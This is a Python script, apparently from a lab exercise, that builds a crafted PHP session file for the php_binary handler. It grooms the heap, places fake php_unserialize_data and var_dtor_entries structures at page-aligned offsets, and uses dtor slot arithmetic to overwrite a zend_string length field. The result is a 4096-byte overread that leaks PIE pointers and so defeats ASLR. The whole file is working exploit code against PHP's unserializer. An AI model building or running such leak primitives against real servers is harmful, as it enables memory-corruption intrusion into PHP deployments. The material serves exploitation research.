#!/usr/bin/env python3
"""PIE-lab leak record builder (php_binary handler).

Record order:  S(string 32) | J(i:4096) | K(filler+fake structs) | a0(array)

The array record allocates a 56 byte zend_array (HashTable) from the same
64 byte bin as the S string; it lands on the first free slot after S and its
arData (+0x10) and pDestructor (+0x28) fields are PIE image pointers.

File byte i maps to address val+i, where val = X1+0x18 and X1 (the ps_files
read buffer zend_string) is page aligned.  The fake php_unserialize_data is
replicated at every page-aligned address inside the buffer.  The fake
var_dtor_entries is written at address B0 with used_slots=U0.

Slot arithmetic (each record's parsed zval is written to the next dtor slot):
    rec1 S -> B0+0x10+16*U0
    rec2 J -> B0+0x10+16*(U0+1) = target
    rec3 K -> target+0x10
    rec4 o -> target+0x20
U0 = (S - B0)/16 - 1 puts the rec2 write on S+0x10 (the zend_string len
field) and keeps every other write inside S's own 64 byte slot.  The stdClass
object allocated by rec4 comes from the same 64 byte bin and lands on the
first free slot after S, so its ce/handlers PIE pointers sit inside the
4096 byte overread window.
"""
import struct
import sys

PAGE = 0x1000


def rec(name, val):
    nb = name.encode()
    assert 1 <= len(nb) <= 127, name
    return bytes([len(nb)]) + nb + val


def build(total, val, P, B0, U0):
    head = rec('S', b's:32:"' + b'Q' * 32 + b'";') + rec('J', b'i:4096;')
    tail = rec('a0', b'a:1:{i:0;i:1;}')
    L = total - len(head) - len(rec('K', b's:')) - len(tail) - 2 - 1
    for _ in range(16):
        h = rec('K', b's:%d:"' % L)
        nl = total - len(head) - len(h) - len(tail) - 2
        if nl == L:
            break
        L = nl
    h = rec('K', b's:%d:"' % L)
    payload_start = len(head) + len(h)
    payload = bytearray(b'A' * L)
    reps = 0
    for m in range(1, total // PAGE + 2):
        off = m * PAGE - 0x18            # page-aligned address X1 + m*PAGE
        b = off - payload_start
        if b < 0 or b + 0x48 > L:
            continue
        struct.pack_into('<QQQQQQQQ', payload, b,
                         P + 56, B0, B0, 0, 0, 0, 0x7fffffff, 1018)
        struct.pack_into('<Q', payload, b + 64, 0)
        reps += 1
    boff = (B0 - val) - payload_start
    assert 0 <= boff and boff + 16 <= L, (hex(B0), boff, L)
    struct.pack_into('<qQ', payload, boff, U0, 0)
    data = head + h + bytes(payload) + b'";' + tail
    assert len(data) == total, (len(data), total)
    return data, dict(total=total, val=hex(val), P=hex(P), B0=hex(B0), U0=U0,
                      reps=reps, payload_start=payload_start, L=L,
                      b_off=boff, head=len(head), khdr=len(h))


def main():
    out = sys.argv[1]
    total = int(sys.argv[2], 0)
    val = int(sys.argv[3], 0)
    P = int(sys.argv[4], 0)
    B0 = int(sys.argv[5], 0)
    U0 = int(sys.argv[6], 0)
    data, meta = build(total, val, P, B0, U0)
    with open(out, 'wb') as fp:
        fp.write(data)
    print('wrote %s %d' % (out, len(data)))
    for k, v in meta.items():
        print('  %s=%s' % (k, v))


if __name__ == '__main__':
    main()
